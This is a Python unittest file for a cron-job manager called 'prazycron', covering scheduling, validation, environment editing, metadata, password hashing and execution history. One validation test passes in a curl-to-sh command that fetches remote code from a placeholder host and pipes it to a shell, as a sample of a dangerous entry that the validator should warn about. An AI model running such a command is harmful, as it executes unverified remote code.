from __future__ import annotations

import tempfile
import unittest
from datetime import datetime
from pathlib import Path
from zoneinfo import ZoneInfo

from prazycron.environment import parse_environment, update_environment
from prazycron.execution import read_history, run_command
from prazycron.metadata import MetadataStore
from prazycron.model import CronEntry
from prazycron.overlap import detect_conflicts, wrap_with_flock
from prazycron.schedule import next_runs
from prazycron.security import make_password_record, verify_password
from prazycron.validation import validate_entry


class ScheduleTests(unittest.TestCase):
    def test_next_runs_daily(self) -> None:
        start = datetime(2026, 8, 4, 21, 0, tzinfo=ZoneInfo("America/Chicago"))
        runs = next_runs("0 3 * * *", 2, start=start, timezone_name="America/Chicago")
        self.assertEqual([run.strftime("%Y-%m-%d %H:%M") for run in runs], ["2026-08-05 03:00", "2026-08-06 03:00"])

    def test_dom_or_dow_semantics(self) -> None:
        start = datetime(2026, 8, 1, 0, 0, tzinfo=ZoneInfo("UTC"))
        runs = next_runs("0 9 15 * 1", 3, start=start, timezone_name="UTC")
        self.assertTrue(all(run.hour == 9 for run in runs))


class ValidationTests(unittest.TestCase):
    def test_invalid_shell_and_schedule(self) -> None:
        issues = validate_entry("99 * * * *", "echo 'broken", "root", source_type="system_file")
        codes = {issue.code for issue in issues}
        self.assertIn("schedule", codes)
        self.assertIn("quotes", codes)

    def test_dangerous_command_warning(self) -> None:
        issues = validate_entry("0 3 * * *", "curl https://example.invalid/x | sh", "root", source_type="system_file")
        self.assertTrue(any(issue.severity == "warning" and issue.code == "danger" for issue in issues))


class EnvironmentTests(unittest.TestCase):
    def test_update_preserves_jobs(self) -> None:
        original = "# header\nPATH=/usr/bin\n0 3 * * * /bin/true\n"
        changed = update_environment(original, {"PATH": "/usr/local/bin:/usr/bin", "MAILTO": "user@example.com"})
        env = parse_environment(changed)
        self.assertEqual(env["MAILTO"], "user@example.com")
        self.assertIn("0 3 * * * /bin/true", changed)


class MetadataAndSecurityTests(unittest.TestCase):
    def test_metadata_roundtrip(self) -> None:
        entry = CronEntry(True, "0 3 * * *", "/bin/true", "testuser", "crontab:user", "user_crontab", 0, "0 3 * * * /bin/true")
        with tempfile.TemporaryDirectory() as tmp:
            store = MetadataStore(Path(tmp) / "meta.json")
            store.update(entry, name="Backup", tags=["daily"], favorite=True)
            loaded = MetadataStore(Path(tmp) / "meta.json").get(entry)
            self.assertEqual(loaded["name"], "Backup")
            self.assertTrue(loaded["favorite"])

    def test_password_hash(self) -> None:
        record = make_password_record("secret", iterations=1000)
        self.assertTrue(verify_password("secret", record))
        self.assertFalse(verify_password("wrong", record))


class ExecutionAndOverlapTests(unittest.TestCase):
    def test_manual_execution_history(self) -> None:
        # Use a unique id so this test never reads unrelated records.
        entry_id = "test-feature-history-20260804"
        record = run_command("printf hello", entry_id, timeout=5, mode="test")
        self.assertEqual(record.exit_code, 0)
        self.assertEqual(record.stdout, "hello")
        self.assertTrue(read_history(entry_id, limit=1))

    def test_duplicate_detection_and_wrapper(self) -> None:
        left = CronEntry(True, "0 3 * * *", "/bin/true", "testuser", "a", "user_crontab", 0, "")
        right = CronEntry(True, "0 4 * * *", "/bin/true", "testuser", "b", "user_crontab", 0, "")
        conflicts = detect_conflicts([left, right])
        self.assertTrue(any(item.kind == "duplicate" for item in conflicts))
        self.assertIn("prazycron-run", wrap_with_flock("/bin/true", "abc"))


if __name__ == "__main__":
    unittest.main()
